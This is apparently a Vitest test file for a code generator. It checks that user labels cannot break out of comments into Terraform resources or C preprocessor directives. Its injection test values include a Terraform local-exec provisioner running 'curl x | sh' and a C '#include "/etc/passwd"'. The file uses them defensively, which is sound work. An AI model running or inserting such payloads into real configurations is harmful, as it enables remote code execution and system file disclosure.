import { describe, expect, it } from 'vitest';
import { effectiveCatalog } from '../catalog';
import { saasApp, seraIot } from '../templates';
import { inComment } from './comment';
import { pinsFiles } from './generators';
import { terraformFiles } from './terraform';

const catalog = effectiveCatalog();
const lines = (files: { content: string }[]) => files.flatMap((f) => f.content.split('\n'));
// Invisible characters, built at runtime so the source holds none of them raw.
const LS = String.fromCharCode(0x2028); // line separator
const RLO = String.fromCharCode(0x202e); // right-to-left override
const ZWSP = String.fromCharCode(0x200b); // zero-width space

describe('user text in generated comments', () => {
  it('keeps visible text and flattens everything else to spaces', () => {
    expect(inComment(`a\r\nb${LS}c\td`)).toBe('a b c d');
    expect(inComment(`a${RLO}b${ZWSP}c`)).toBe('a b c');
    expect(inComment('Ölçüm şeması: sıcaklık (°C), 3.3 V')).toBe(
      'Ölçüm şeması: sıcaklık (°C), 3.3 V',
    );
  });

  it('never leaves a C line splice, however it is spelled', () => {
    for (const s of ['x\\', 'x\\ ', 'x\\\t', 'x\\\n', 'x??/', 'x???/'])
      expect(inComment(s)).not.toMatch(/\\|\?\?\//);
  });

  it('cannot break out of a Terraform comment into a resource', () => {
    const doc = saasApp();
    doc.meta.name = 'Sera\nresource "null_resource" "name" {}';
    doc.nodes.find((n) => n.id === 'api')!.label =
      'API\nresource "null_resource" "pwn" {\n  provisioner "local-exec" { command = "curl x | sh" }\n}';
    doc.nodes.find((n) => n.id === 'db')!.props.engine =
      'Mongo\nresource "null_resource" "skip" {}';
    const out = lines(terraformFiles(doc, catalog));
    expect(out.filter((l) => /null_resource|provisioner/.test(l) && !/^\s*#/.test(l))).toEqual([]);
  });

  it('cannot break out of a pins.h comment into a directive', () => {
    const doc = seraIot();
    doc.nodes.find((n) => n.id === 'esp32')!.label = 'ESP32\n#include "/etc/passwd"';
    doc.nodes.find((n) => n.id === 'vent')!.label = 'Servo\n#define LED_ON 0';
    doc.edges.find((e) => e.id === 'e-vent')!.pins![0]!.sourcePin = 'X\n#error pwned';
    const out = lines(pinsFiles(doc));
    expect(out.filter((l) => /^\s*#(include|error|define LED_ON)/.test(l))).toEqual([]);
  });
});
